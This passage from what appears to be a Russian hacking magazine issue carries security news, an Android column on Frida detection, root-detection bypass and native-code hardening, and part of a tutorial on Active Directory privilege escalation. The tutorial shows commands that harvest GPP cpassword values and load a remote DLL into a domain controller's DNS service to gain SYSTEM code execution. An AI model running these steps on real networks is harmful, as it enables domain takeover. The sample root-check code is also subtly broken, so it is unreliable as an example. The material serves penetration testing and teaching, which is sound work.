  всего, пока лишь собирает доступ к уязвимым устройствам, «зачищает их»
  и готовится к последующей кампании.
     Нужно заметить, что в целом уста новка патчей все же идет хорошо. Если
   в декабре 2019 года количество уязвимых систем оценивалось в 80 тысяч
  серверов, то в середине янва ря их число сократилось примерно до 25 тысяч,
  а к концу месяца и вовсе опус тилось ниже отметки 11 тысяч систем.


  20 000 ДОЛЛАРОВ ЗА БАГИ В XBOX


   Компания Microsoft объявила официальный старт bug bounty программы для игро вой плат‐
  формы Xbox. За обнаруженные уязвимости в сети Xbox Live и сервисах иссле дователям зап‐
   латят от 500 до 20 000 долларов США.

   Компанию интересуют баги, ведущие к выполнению кода, повышению привилегий, обхо ду
   механизмов безопасности, рас крытию информации, спуфингу и другим изменениям. На проб‐
   лемы отказа в обслужива нии (DoS) программа не распространяется.


   Так, уязвимости, допускающие удален ное выпол нение кода, могут принести спе циалис там
   от 5000 до 20 000 долларов, а уязвимос ти, допус кающие повышение привилегий, — от 1000
   до 8000 долларов.





 WELEAKINFO
 ЗАКРЫЛИ
  Совместная операция ФБР и правоохранителей из Северной Ирландии,
  Нидерландов, Германии и Великоб ритании привела к изъ ятию домена сай та
   WeLeakInfo.com. Более трех лет этот сервис продавал доступ к данным свы‐
  ше 12,5 миллиарда учетных записей, соб ранных из 10 тысяч утечек. Фак‐
   тически за плату сайт предоставлял доступ к паролям людей открытым тек‐
   стом. При этом сам дос туп стоил всего 2 доллара в день.





  На черном рынке сайт был известен и пользовался популярностью. Так,
  хакеры покупали доступ к WeLeakInfo, а затем иска ли в его недрах имя, email‐
  адрес или имя пользователя, которого хотели взломать. В ответ на такие зап‐
  росы сайт возвращал все связанные с этим пользовате лем данные, ранее
   утекшие из различных источников, вклю чая пароли, если те были дос тупны.
  Злоумышленники использовали такие пароли, пытаясь авторизоваться с их
  помощью в различных профилях пользователя (надеясь, что жертва повторно
  использовала одинаковые пароли на раз ных сай тах).
    В своем пресс‐релизе Министерс тво юстиции США обратилось к общес‐
   твенности с просьбой помочь выявить владель цев сайта, а днем позже гол‐
  ландская полиция арестовала 22‐летнего мужчину, который, похоже, был опе‐
  ратором WeLeakInfo.
    Напомню, что это не пер вый закрытый ресурс такого рода. В 2017 году
  правоохраните ли ликвидировали дру гой «агрегатор утечек», торговавший
  чужими личными данными, — LeakedSource. Его авторы, компания Deﬁant
  Tech Inc., собирали дампы раз личных утечек данных (как из откры того дос‐
   тупа, так и покупая их напрямую у хакеров), а затем продавали дос туп к этой
   гигантской базе всем желающим. Среди дос тупных на сайте данных чис‐
  лились  имена  поль зователей, ФИО,  email‐адреса,  почтовые  адре са,
  телефонные номера, а также пароли в открытом виде.
    В настоящее время сущес тву ет как минимум три других сайта, которые
  работают по той же схеме, что LeakedSource и WeLeakInfo: продают доступ
   к похищенным данным, включая пароли в открытом виде. Это DeHashed,
  Snusbase и Leak‐Lookup.


  УДАР ПО КРИПТОДЖЕКИНГУ
   Интерпол и CERT рассказали о проведении меж дународ ной операции Goldﬁsh Alpha, про шед‐
   шей при поддержке Cyber Defense Institute и Trend Micro. Благодаря этой операции от малвари
   были очищены взломанные маршрутизаторы MikroTik в десяти странах Юго‐Восточной Азии.

   Операция началась после того, как в июне прошлого года был обнаружен взлом более 20 000
   маршрутизаторов MikroTik, которые преступники использовали для майнин га криптовалюты.


   Взлом девайсов MikroTik и внедрение на них криптоджекинговых скрип тов популярен среди
   хакеров с 2018 года. Уже тогда были взломаны и заражены более 200 000 устройств.

  В операции приняли участие правоохранительные органы и представите ли CERT разных стран,
   включая Бруней, Камбоджу, Индонезию, Ла ос, Ма лайзию, Мьянму, Филиппины, Син-
   гапур, Таиланд и Вьетнам.

   Совместные усилия помогли сократить не только чис ло зараженных устройств, но и криптодже‐
   кинг в Юго‐Восточной Азии на 78% по сравнению с июнем 2019 года.





 СКАЖЕМ BLOATWARE
 НЕТ
  Более 50 организаций (включая Privacy International и Аме риканский союз
  гражданских свобод) в открытом письме, адресованном исполнительному
  директору Alphabet Сундару Пичаи, попросили Google принять меры в отно‐
  шении bloatware и защитить пользователей от предус тановленных на Android‐
  устройствах приложений. Речь идет о так называемом «избыточном ПО» (оно
  же «фуфлософт»), которое устанавлива ется на устройства в нагрузку и дос‐
   тупно сразу из коробки.
    Подписавшие письмо организа ции объясня ют, что многие bloatware‐при‐
  ложения невозможно удалить и из‐за них данные пользователей могут
  собирать недобросовестные про изво дители устрой ств и приложений (без
  ведома и согласия самих пользователей, конечно же). Неред ко такие при‐
  ложения могут иметь и привилегированные раз решения, которые позволя ют
  им обходить защитные механизмы Android.
     Авторы послания ссылаются на исследование, проведенное в 2018 году,
  которое показало, что экосистема предус тановленных приложений на Android
  находится в полном беспорядке. Так, согласно исследованию, 91% всех пре‐
  дустановленных приложений вообще недоступны в офи циальном каталоге
  Google Play. То есть они не проходят процедуру проверки Google, не про‐
  веряются на предмет избыточных раз решений, на наличие известных уяз‐
  вимостей  и  вредоносной  функциональнос ти,  не  могут  обновляться
  с помощью механизма Play Store и так далее.
    Наибольшую угрозу такие приложения представляют для пользовате лей
  бюджетных гаджетов по всему миру, и авторы письма подчеркивают, что
   «конфиденциальность не может быть рос кошью, предлагаемой только тем
  людям, которые могут позволить себе дорогой телефон».
    Организации просят гла ву Google ввес ти новые нормы для OEM‐произво‐
  дителей, ужесточив правила для приложений, которые могут предварительно
   устанавливаться на устройства. Так, сто ит добавить как минимум три сле‐
  дующих правила:
   • пользователи дол жны иметь возможность навсегда удалить приложе ния
     со своих устройств. Это должно касать ся и любых фоновых служб, которые
     продолжают работать, даже если приложения отключены;
   • предустановленные приложения дол жны проходить такие же проверки, что
     и приложе ния в Google Play Store, особенно в воп росах пользовательских
     разрешений;
   • предустановленные приложения дол жны иметь механизм обновле ния,
     желательно через Google Play и без необ ходимости создавать отдельную
      учетную запись. Google должна отказывать в сертификации устройств
     по соображениям конфиденциальности, если производители или вендоры
     пытаются эксплуатировать пользователей таким образом.

  Интересно, что по чистой случайнос ти откры тое письмо было опубликовано
  практически  одновременно  с  сообщением  ИБ‐компании  Malwarebytes.
  Эксперты предупредили о малвари, найденной в двух приложе ниях, предус‐
  тановленных на бюджетные смартфоны Unimax (UMX) U686CL, которые пред‐
   лагаются американцам с низким уровнем доходов по специальной прог‐
  рамме Lifeline, субсидируемой пра витель ством (сто ят такие смартфоны все‐
   го 35 долларов).
     Такие Android‐девайсы про изво дятся в Китае и продаются компанией As‐
   surance Wireless, поставщиком услуг сотовой свя зи, входящим в группу Virgin
   Mobile.
    Обратив внимание на жалобы поль зователей этих устрой ств, компания
  приобрела смартфон UMX U686CL и вниматель но его изу чила. Быс тро выяс‐
   нилось, что один из компонентов устройства, при ложе ние Wireless Update,
  содержит малварь Adups.
     Этот вредонос был впервые замечен в 2016 году, когда специалисты ком‐
  пании Kryptowire случайно обнаружили, что сис тема обновления ПО FOTA
   (Firmware Over The  Air), то есть неуда ляемое приложение com.adups.fota,
  которую разрабатывает китайская компания Shanghai Adups Technology Com‐
   pany, представляет опас ность для пользователей. Команда Kryptowire выяс‐
   нила,  что компания Adups имеет возможность отправлять обновления
  на устройства поль зователей, минуя  как поставщиков смартфонов,  так
  и самих пользователей.
     Теперь эксперты Malwarebytes пишут, что данный компонент в настоящее
  время используется на устройствах UMX и при меня ется для установки при‐
  ложений без ведома пользователя. Причем, кем именно используется, оста‐
   ется неясным. Пока все изу ченные исследова теля ми приложения оказались
  чисты и не содер жали малвари, но все же они добавлялись на устройства
  без разрешения и ведома владельцев.
     Также специалисты обнаружили подозрительный код в приложе нии Set‐
   tings. По словам исследователей, приложение зараже но некой разновид‐
  ностью сильно обфусцированной малвари, предположительно китайского
  происхождения. Судя по всему, это дроппер извес тного рекламного вре‐
  доноса HiddenAds.
    Подчеркивается, что оба вредоносных приложения невозможно удалить.
   Хотя пользователи могут избавиться от приложения Wireless Update, из‐за
   этого телефон перестанет обновлять ся и пропустит критические обновления
  безопасности для своей прошивки.
     Нужно отметить, что у экспертов нет полной уверенности в том, что имен‐
  но Unimax несет ответственность за появление мал вари на устройствах. Воз‐
  можно, вре доносное ПО было добавлено  сторонними разработчиками
  из цепочки поставок.


  2 000 000 ПОЛЬЗОВАТЕЛЕЙ ПОД АТАКАМИ
   «Лаборатория Касперского» проанализировала некоторые из наиболее акту альных киберуг роз,
   подвергающих риску личную информацию пользователей.


   Согласно статистике ком пании, в 2019 году в мире значительно вырос ло число пользователей,
   атакованных программа ми для кражи паролей, — на 72%. Всего про дукты компании отразили
   подобные атаки на устройствах почти 2 000 000 пользователей.

   Кроме того, в 2019 году значительно выросло количес тво фишинговых атак, в ходе которых
   злоумышленники, как правило, пытаются заполучить личные и платежные дан ные пользовате‐
   лей. В этот период решения «Лаборатории Касперского» ежемесячно пре дотвращали в сред‐
   нем 38 000 000 попыток перехода пользователей на мошен ничес кие сайты.





 СОКРАЩЕНИЯ
 В MOZILLA
  В середине января стало извес тно, что 70 из 1000 сотрудников по всему
  миру Mozilla были уволены, так как надежды организации на источники
   дохода, не связанные с поиском, пока не оправдались. В будущем сок‐
  ращение может ждать и других сотрудников, так как Mozilla все еще изучает,
   как все это повлияет на филиалы в Великобритании и Франции.



         «Воз можно, вы пом ните,  что в 2019 и 2020  годах мы ожидали
         получить доход от новых продук тов по под писке, а  так же более
        высокие доходы  от  источников, не  связанных  с поис ком. Этого
        не произош ло, — пишет вре менная гла ва  Mozilla Митчелл Бейкер
         в письме для сотрудников. — В нашем пла не на 2019 год мы недооце-
         нили, сколько вре мени потребу ется для соз дания и выпус ка новых
        продук тов,  приносящих  доход.  Учитывая  опыт,  приобре тенный
         в 2019 году, и то, что мы узна ли о тем пах инноваций, мы решили
         использовать  более  консерва тив ный  под ход  к  прогнозированию
         доходов на 2020 год. Так же мы согласились с тем, что нужно жить
        по средс твам и в обоз римом будущем не тра тить больше, чем
         зараба тыва ем».

   Также сообщается, что руководс тво Mozilla думало закрыть собс твенный
  фонд инноваций (Mozilla innovation fund), но пока решило, что он нужен
  для продолжения разработки новых продуктов, на что организация в общей
  сложности выделяет 43 миллиона долларов.
    Дело в том, что много лет основным источни ком доходов Mozilla остается
   поиск. Компании платят сотни миллионов долларов, чтобы стать поисковой
  системой по умол чанию в Mozilla Firefox. Google была основным клиентом
   Mozilla на протяжении многих лет, но также Mozilla заключала сделки с Yahoo!,
   Yandex, Baidu и другими поисковиками. В пос ледние годы эти сделки обес‐
  печивали более 90% доходов Mozilla.
     Так как доля  Firefox на рынке постепенно снижается и зависимость
  доходов от партнерских отношений с поисковыми сис темами (которые тоже
  снижаются) вызывает понятное беспокойство, руководс тво  Mozilla ищет
  новые источники дохода. В основном это раз личные продукты по подписке,
   никак не связанные с поиском. К примеру, орга низация занимается раз‐
  работкой собственного VPN‐сервиса, который будет доступен по подписке
  за 4,99 доллара США в месяц (услуга пока еще недос тупна для широкой
  общественности). Также Mozilla предлагала вариант под держки для компаний
  за 10 долларов США за одного пользователя, но быстро отказалась от этой
   идеи, сообщив, что все еще изу чает корпоративный сегмент.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Первый арест группировки MageCart: в Индонезии задер жали тро их подоз реваемых


  В Firefox исправлена уязвимость нулевого дня, находящаяся под атаками


   Исследователи продемонстрировали взлом TikTok при помощи SMS


   Amazon уволила ряд сотрудников, которые подсматривали за пользователями камер Ring


  АНБ обнаружило опасную крип тографическую уязвимость в Windows


  В Сети нашли список учетных данных для 500 тысяч IoT‐устройств


    Ubisoft судится с операторами нес кольких сервисов для DDoS‐атак


   Apple отказалась от пла нов внедрить сквозное шифрование в iCloud


   ProtonMail и StartMail заблокированы в России


   Free Software Foundation призывает Microsoft открыть исходники Windows 7
HEADER

 ANDROID

        ОБНАРУЖЕНИЕ FRIDA,
       ОТКЛЮЧЕНИЕ ПРОВЕРКИ
        НА ROOT И ANDROID 11





Сегодня в выпус ке: восемь способов обна‐
ружить внедрение Frida в приложение, три
совета, как защитить натив ные библиотеки
от реверса, отклю чение про верки на root
в   подопытном   приложении,   защита          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
от метарефлексии в Android  11, принцип              zobnin@glc.ru
работы Huawei Quick Apps, а также под‐
борка инструментов пентесте ра и биб‐
лиотек для разработчиков.


                ПОЧИТАТЬ


Как обнаружить Frida
Detect Frida for Android — статья о том, как обна ружить, что приложение
работает под управлением Frida (известный инс трумент, позволяющий перех‐
ватить управление приложением и внедрить код). Автор приводит пять извес‐
тных техник и три собственные:
 1. Поиск библиотек frida‐agent и frida‐gadget в файле /proc/<pid>/maps.
  Может закончиться неудачей, если взломщик изменит имена библиотек.
 2. Поиск в памяти нативных библиотек особых строк (как рассказано в этой
   статье). Взломщик может перекомпилировать Frida с изме ненными стро‐
   ками.
 3. Пройти по всем открытым TCP‐портам, отправить в них dbus‐сообщение
  AUTH и дождаться ответа Frida. Метод хорошо работает при исполь‐
   зовании frida‐server (на рутованном устройстве), но бесполезен, если при‐
   ложение было перепа кова но с включением в него frida‐gadget (способ
   обычно применяется, когда невоз можно получить root на устрой стве).
 4. Проверить наличие специфичес ких для Frida фай лов в каталоге /data/
  local/tmp. Опять же взломщик может переименовать эти фай лы.
 5. Проверить, открыты ли для записи исполняемые секции нативных биб‐
   лиотек. В нормальной ситуации это почти невоз можно.
 6. Поиск потоков frida‐server и frida‐gadget, которые Frida запускает в рамках
   процесса подопытного приложения.
 7. Поиск спе цифичных для Frida именованных пайпов в каталоге /proc/<
  pid>/fd .
 8. Сравнение кода нативных библиотек на диске и в памяти. При внедрении
   Frida изменяет секцию text нативных биб лиотек.

Примеры использования последних трех техник опубликованы в репозитории
на GitHub.


Об ход детек та root с помощью Frida
Android Root Detection Bypass Using Objection and Frida Scripts — рас сказ
о способах отклю чить проверку на права root в подопытном приложении
с помощью Frida или тулкита Objection на базе Frida.
  В большинстве случаев будет достаточно либо ска чать уже готовый скрипт
из репозитория Frida, либо вос поль зовать ся тулкитом Objection для отклю‐
чения проверки на root:


android root disable

Однако эти способы могут не сра ботать, и тогда придется писать свой собс‐
твенный  скрипт. Для  это го необходимо декомпилировать/дизассембли‐
ровать подопытное приложение и найти в нем функцию, ответс твенную
за проверку наличия прав root на устройстве. Обычно она выглядит примерно
так:


private static boolean detectmethods() {
    String[] arrayOfString = new String[10];
    arrayOfString[0] = "/system/app/Superuser.apk";
    arrayOfString[1] = "/sbin/su";
    arrayOfString[2] = "/system/bin/su";
    arrayOfString[3] = "/system/xbin/su";
    arrayOfString[4] = "/data/local/xbin/su";
    arrayOfString[5] = "/data/local/bin/su";
    arrayOfString[6] = "/system/sd/xbin/su";
    arrayOfString[7] = "/system/bin/failsafe/su";
    arrayOfString[8] = "/data/local/su";
    arrayOfString[9] = "/su/bin/su";
    int a = arrayOfString.length;
    int b = 0;
    while (a < b) {
        if (new File(arrayOfString[a]).exists()) {
            return true;
        }
        a += 1;
    }
    return false;
}

Допустим, она находит ся внутри клас са roottest в Java‐пакете com.test.
test. Все, что нам нужно сделать, — подменить эту функцию на заглушку,
которая всегда возвращает false. Для этого понадобится такой скрипт:


Java.perform(function () {
    var MainActivity = Java.use('com.test.test.roottest');
        MainActivity.root.implementation = function (detectmethods) {
            console.log('Done: bypassed');
            return false;
        };
}

Далее скармливаем наш скрипт Frida и запус каем под ее управле нием при‐
ложение:


$ frida ‐l rootbypass.js ‐f имя.пакета.приложения


Как защитить нативную биб лиоте ку
Security  hardening  of  Android  native code —  статья,  рассказывающая,
как защитить от реверса нативные библиотеки в приложениях для Android.
  Обычно разработчики выносят сенситивный код в нативные, написанные
на языках C/C++ библиотеки, чтобы повысить производительность и зат‐
руднить реверс приложения (читать дизас семблерные листинги нативного
кода гораздо сложнее, чем код smali, и тем более сложнее, чем деком‐
пилированный с помощью того же jadx код на Java). Однако не стоит
забывать, что одно лишь наличие нативного кода не остановит опытного
и мотивированного взломщика, поэто му стоит исполь зовать дополнительные
средства, чтобы его запутать. Есть нес колько несложных способов это сде‐
лать.
  Спо соб 1: замена вызовов функций стандартной библиотеки языка
С (libc, роль которой в Android игра ет Bionic) пря мыми системны ми вызовами.
Это  позволит  защитить ся  от  взломщиков,  которые  используют  Frida
для перехвата вызовов функций или подменяют биб лиотеку libc аналогом
с функцией дам па всех вызовов и возвращаемых ими данных (например,
какие файлы открывает приложение, какие порты слу шает).
  Применять системные вызовы напрямую доволь но сложно, но можно вос‐
пользоваться наработками проекта MUSL с реализацией минималистичного
варианта libc. Для это го достаточно взять из проекта файл syscall_arch.h
и использовать определенный в нем набор функций __syscallX, где X —
это число аргументов системного вызова. Реализованные с помощью этой
функции системные вызовы open и read могут выглядеть так:


static inline int  my_openat(int __dir_fd, const void* __path, int
__flags, int __mode ){
    return (int)__syscall4(__NR_openat, __dir_fd, (long)__path,
__flags, __mode);
}


static inline ssize_t my_read(int __fd, void* __buf, size_t __count){
    return __syscall3(__NR_read, __fd, (long)__buf, (long)__count);
}

Обрати внимание: благода ря ключевому слову inline код этих функций
будет встроен в вызыва ющий код, что еще больше усложнит его анализ.
  Спо соб 2: замена функции libc на собственные реализации. Кроме фун‐
кций — оберток системных вызовов, биб лиотека libc также включает в себя
множество подсобных функций, в том числе для работы со строками (strcmp,
strlen, strstr) и памятью (memcmp, memset, memcpy). Эти функции также лучше
встроить прямо в код библиотеки. Взять их реализацию можно из той же биб‐
лиотеки MUSL или Glibc.
  Спо соб 3: обфускация с помощью Obfuscator‐LLVM. Этот форк известно‐
го набора компиляторов LLVM выполняет преобра зования кода (запуты вание
графа исполнения, замена инс трукций, мертвые инструкции, тупиковые
переходы и так далее), затрудня ющие его ана лиз. Чтобы заставить среду раз‐
работки собрать библиотеку с использованием O‐LLVM, необходимо внести
соответствующие правки в CMakeLists.txt, указав путь до O‐LLVM (первая
переменная):


set(OLLVM_PATH ${CMAKE_HOME_DIRECTORY}/../../../../../build/bin)
set(OLLVM_C_COMPILER ${OLLVM_PATH}/clang)
set(OLLVM_CXX_COMPILER ${OLLVM_PATH}/clang++)


set(OLLVM_C_FLAGS "‐mllvm ‐sub ‐mllvm ‐bcf ‐mllvm ‐fla")


set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} ${OLLVM_C_FLAGS}")
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} ${OLLVM_C_FLAGS}")
set(CMAKE_C_COMPILER ${OLLVM_C_COMPILER})
set(CMAKE_CXX_COMPILER ${OLLVM_CXX_COMPILER})

Размер результирующей биб лиотеки при этом может возрасти в десять раз
благодаря внедрению больших объемов неис поль зуемого кода и запуты‐
ванию графа исполне ния.


Защита от метареф лексии в Android 11
Android  11  will harden hidden  API  restrictions and remove  meta‐reﬂection
bypass — небольшая заметка о появившемся в исходных кодах AOSP ком‐
мите, который запрещает дос туп к скрытым методам с помощью метареф‐
лексии.
   Это продолжение истории, начавшейся с выпус ком Android 9, в котором
Google запретила доступ ко многим скрытым методам Android. Такие методы
есть в операционной сис теме, но отсутству ют в SDK и документации, так что
с помощью стандартного SDK их не вызвать, одна ко всегда можно было сде‐
лать это с помощью рефлексии. В Android 9 такой способ вызова перестал
работать, но оказалось, что защиту можно обой ти с помощью двойной реф‐
лексии (или метарефлексии), когда вмес то вызова метода самостоятельно
приложение просит сделать это операционную систему:


val forName = Class::class.java.getMethod("forName", String::class.
java)
val getMethod = Class::class.java.getMethod("getMethod", String::
class.java, arrayOf<Class<*>>()::class.java)
val someHiddenClass = forName.invoke(null, "android.some.hidden.
Class") as Class<*>
val someHiddenMethod = getMethod.invoke(someHiddenClass, "someHi
ddenMethod", String::class.java)


someHiddenMethod.invoke(null, "some important string")

Начиная с Android 11 этот способ также перестанет работать, но только
в приложениях, соб ранных для API 30 и выше (targetSdk=30). Приложения,
собранные для более ранних версий Android, смогут использовать реф‐
лексию.


Не известные инстру мен ты пен тесте ра
Lesser‐known Tools for Android Application PenTesting — статья о не самых
известных, но полезных пентест‐инс трументах. Краткий спи сок:
 • Magisk  предоставляет  возможность  не  только  получить  права  root
   на устройстве, но и скрыть наличие этих прав;
 • Move Certiﬁcate — модуль Magisk, позволяющий сделать любой сер‐
   тификат системным;
 • DisableFlagSecure — модуль Magisk, отключающий защиту от сня тия
   скриншотов (FLAG_SECURE). В прошлом дай джесте мы рас сказывали,
   как сделать это с помощью Frida;
 • Smali Patcher — приложение для Windows, генерирующее кастомные
   модули Magisk с различной функциональностью: отключение защиты
   на снятие скрин шотов, подделка мес тополо жения, отключение проверки
  цифровых подписей приложений и так далее;
 • ADB Manager — приложение, поз воляющее запустить ADB в режиме Wi‐Fi;
 • ProxyDroid — позволяет выбрать прокси индивидуально для каждого при‐
   ложения;
 • Pidcat — утилита для выборочного отоб ражения логов logcat с удобным
  форматированием.


Huawei Quick Apps
Huawei Quick Apps  is Huawei’s alternative to Google Instant Apps — статья
о Huawei Quick Apps, сво еобразной альтернативе Google Instant Apps, раз‐
работанной в ответ на запрет использовать сервисы Google в смартфонах
Huawei.
   Как и Google Instant Apps, Quick Apps представляют собой мини‐приложе‐
ния, которые можно запустить, просто перей дя по ссылке без необходимости
что‐либо устанавливать. Это могут быть демоверсии игр, уре занные версии
полноценных приложений или даже одно разовые приложения, с помощью
которых пользователь может выполнять какие‐то редкие дей ствия, такие
как покупка билетов на самолет или товаров.
  В отличие  от  Google, которая предлага ет писать мини‐приложения
как обычные приложения для Android с урезанной функци ональностью,
Huawei предпочла использовать для мини‐приложений язык JavaScript. Бла‐
годаря этому Quick Apps про ще в написа нии (по оценкам компании, средний
размер исходного тек ста составляет всего 20% от размера исходного текста
Instant Apps) и занимают намного меньше пространс тва в памяти телефона.
При этом выглядят они точно так же, как родные приложения Android.





  Сравнение обычных приложений Google Instant Apps, мини‐приложе ний
  WeChat и Huawei Quick Apps

С другой стороны, фреймворк Quick Apps не позволя ет использовать пол ный
набор Android API и затрудняет соз дание мини‐версий полноценных при‐
ложений. Например, что бы сделать мини‐приложение на основе пол ноцен‐
ного приложения для  Android, надо прос то выкинуть из оригинального
исходного кода часть функций и внес ти незначительные изменения. В слу чае
с Quick Apps придется переписать приложение на языке JavaScript.
   Huawei заявляет, что Quick Apps смо гут работать не только на смартфонах
Huawei на базе Android 10, но и на смартфонах 12 других производителей,
занимающих 85% рын ка Китая и 35% глобального рынка. Для создания при‐
ложений подготовлена специальная IDE.


             ИНСТРУМЕНТЫ


 • Quark‐engine — эвристический движок ана лиза мал вари;
 • Corellium‐android‐unpacking — скрипт для взлома приложений, запакован‐
   ных с помощью различных упа ковщиков.


              БИБЛИОТЕКИ


 • DetectFrida — PoC трех способов детекта Frida;
 • Compose‐router — компонент Jetpack Compose для управления историей
   навигации по приложению;
 • Android‐cookie‐store —  хра нилище  кукисов  для  HttpURLConnection
   и OkHttp;
 • Leoric — библиотека, защищающая приложение от принудительной оста‐
   новки;
 • Vosk‐api — Java/Python/JS‐биндинги для тулкита офлайнового распозна‐
   вания речи Vosk;
 • Andriller — коллекция утилит для кримина лис тичес кого анализа смартфо‐
   нов с Android;
 • PowerSpinner — красивый выпада ющий спи сок;
 • Timeline‐View — очередная библиотека для создания экрана таймлайна;
 • PaintableVectorView — библиотека, поз воляющая динами чески перек‐
   рашивать векторные изоб ражения;
 • ZoomRecyclerLayout — аниматор с эффектом зума для RecyclerView;
 • DoubleLift — библиотека для эффектно го сворачивания‐разворачивания
   лейаутов.
COVERSTORY
 АТАКИ
   НА ACTIVE DIRECTORY





    РАЗБИРАЕМ АКТУАЛЬНЫЕ МЕТОДЫ
     ПОВЫШЕНИЯ ПРИВИЛЕГИЙ





Чтобы   скомпрометировать   контроллер
домена, мало найти известную уязвимость,
получить  учетные  данные  пользователя
или  обнаружить  ошибку  в  настройке
политики  безопасности.  Это  обеспечит             RalfHacker                                                                                             hackerralf8@gmail.com
тебе минимальный доступ, но его может
не хватить для достижения всех намечен‐
ных целей. Поэтому залог успешной ата‐
ки — получение повышенных системных
привилегий в Active Directory. О методах
решения этой увлекательной задачи мы
и поговорим.


             INFO

                       Как гласит воен ная наука, име ющая много обще‐
                         го с хакерским ремеслом, прежде чем ввязаться
                        в сражение, нужна разведка местности. О том,
                         как извлечь пользовательские данные в Active Di‐
                             rectory, читай в статье «Разведка в Active Directo‐
                                 ry. Получаем пользовательские данные в сетях
                     Windows без привилегий».



ПАРОЛИ ИЗ SYSVOL И GPP
На каждом компьюте ре с Windows, который работает в сети с Active Directory,
имеется встроенная учетная запись администратора, защищенная паролем.
Одно из стандартных требова ний безопасности — регулярно менять этот
пароль. Казалось бы, задача нес ложная. Но только не когда в сети нас‐
читывается под сотню машин.
   Чтобы облегчить себе жизнь, ленивые системные админис траторы иногда
используют групповые политики для установки пароля локального админис‐
тратора на большом количестве рабочих станций. Это довольно удобно, да и
заменить такой пароль, когда придет срок, можно за пару минут. Одна
незадача: на всех компьютерах пароль локального админа будет одинаковый.
  Из этого следует вывод: получение учетных данных администратора
на одной из машин сделает зло умышленника адми ном сразу на всех. Рас‐
смотрим два спо соба добить ся такого результата.


Учетные дан ные в SYSVOL
SYSVOL — это обще доменный ресурс Active Directory, к которому у всех авто‐
ризованных пользователей есть дос туп на чтение. SYSVOL содержит сце‐
нарии входа, данные групповой политики и другие данные, которые должны
быть доступны везде, где распространяется политика домена. При этом
SYSVOL автоматически син хронизируется и используется все ми контрол‐
лерами домена. Все групповые политики домена хранятся по адресу


\\<Домен>\SYSVOL\<Домен>\Policies\

Чтобы упростить управление локальной учетной записью админис тратора
на удаленных компьютерах с Windows, для каж дой из них можно использовать
собственный сценарий смены пароля. Проблема в том, что часто пароль хра‐
нится в виде открытого текста в скрипте (например, в файле VBS), который,
в свою оче редь, находится в SYSVOL. Вот пример одного из результатов
поиска сценария VBS, меня ющего пароль  локального адми нистратора
на сетевых машинах.





          Пример VBS‐скрипта с официального сайта MSDN

Этот сценарий доступен в галерее Microsoft TechNet, из‐за чего нередко
используется  системными  администратора ми,  которые  предпочитают
готовые решения. Извлечь из него пароль не сос тавля ет никакого труда.
А поскольку скрипт хранится в SYSVOL, к которому у каждого пользовате ля
домена есть доступ для чтения, наличие пароля автоматически превращает
его обладателя в локального администратора на всех сетевых машинах
с виндой на борту.


Настройки групповой политики
В 2006 году инструмент PolicyMaker от Microsoft Bought Desktop Standard был
переименован и выпущен вместе с Windows Server 2008 как Group Policy Pref‐
erences (GPP, «предпочтения групповой полити ки»). Одна из наиболее полез‐
ных функций GPP — возможность соз давать локальных пользователей, нас‐
траивать и изменять их учетки, а также сохранять учетные данные в нес коль‐
ких файлах сценариев:
 • карта дисков (Drives.xml);
 • источники данных (DataSources.xml);
 • конфигурация прин тера (Printers.xml);
 • создание/обновле ние сервисов (Services.xml);
 • запланированные задачи (ScheduledTasks.xml).

Инструмент, безусловно, полезный: с его помощью можно автоматизировать
многие рутинные действия. Например, GPP поз воляет использовать груп‐
повую политику для выполнения зап ланированных задач с заданными учет‐
ными данными, а также при необходимости менять пароли локального адми‐
нистратора на боль шом количес тве компьюте ров.
   Теперь давай посмотрим, как эта штука работает. При создании нового
предпочтения групповой политики в SYSVOL генерируется связанный XML‐
файл с соответствующими данными конфигурации. Если в ней указан пароль
пользователя, он будет зашифрован AES 256 бит. Но в 2012 году Microsoft
опубликовала в MSDN ключ AES, который можно использовать для рас‐
шифровки пароля.





              Ключ шифрования, представленный MSDN

Иными словами, любой авторизованный в домене юзер может найти в общем
ресурсе SYSVOL файлы XML, содержащие cpassword, то есть зашифрован‐
ный пароль AES.





              Пример содержимого фай ла Groups.xml

Быстро найти эти значения мож но следующей командой:


C:\> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policy\*. xml

Для расшифров ки пароля можно вос пользоваться инстру ментом Cryptool,
при этом нужно в ручном режиме декодировать Base64 и указать ключ
с MSDN (подробная инструкция по рас шифровке приведена в статье на Хаб‐
ре). Существует и полностью автоматизированное средство под названием
gpp‐decrypt, которое требует толь ко значение cpassword и уже предустанов‐
лено в Kali Linux. Аналогичная утилита для Windows называется Get‐GPPPass‐
word, ее можно отыскать в наборе программ PowerSploit.
   Ну а для очень ленивых есть модуль smb_enum_gpp из набора Metasploit.
Этот инструмент попросит указать только учетные данные пользователей
и адрес контроллера домена.
   Так мы можем получить пароль локального администратора, и в боль‐
шинстве случаев он будет работать на всех компьютерах домена.


DNSADMINS
Microsoft не только реализовала собственный DNS‐сервер, но и внедрила
для него протокол управления, позволяющий интегри ровать DNS‐сервер
с доменами Active Directory. По умолчанию контроллеры домена также явля‐
ются DNS‐серверами, поэто му DNS‐серверы должны быть доступны каждому
пользователю домена. Это, в свою очередь, открывает потенциальную воз‐
можность для атаки на контроллеры домена: с одной стороны мы имеем сам
протокол DNS, а с другой — протокол управления, основанный на RPC.
   Пользователь,  входящий  в  группу DNSAdmins  или имеющий права
на запись в объекты DNS‐сервера, может загрузить на DNS‐сервер про‐
извольную DLL с привилегиями System. Это очень опасно, поскольку многие
корпоративные сети используют контроллер домена в качестве DNS‐сер‐
вера.
   Таким образом, для реализации атаки мы можем прос то загрузить
на DNS‐сервер произвольную библиотеку с помощью dnscmd (путь \\ops‐
build\dll должен быть доступен для чтения DC):


PS C:\> dnscmd ops_dc/config/serverlevelplugindll \\ops‐build\dll\
mimilib.dll

Чтобы проверить, была ли загружена DLL, можно использовать следующую
команду:


PS C:\> Get‐ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\
Parameters\ ‐Name ServerLevelPluginDll

Так как наш пользователь — член группы DNSAdmins, мы можем перезапус‐
тить службу DNS:


C:\> sc \\ops‐dc stop dns
C:\> sc \\ops‐dc start dns

После перезапуска DNS‐сервера будет выполнен код из загруженной биб‐
лиотеки. Такая библиотека, нап ример, может содержать скрипт PowerShell
для обратного подклю чения.





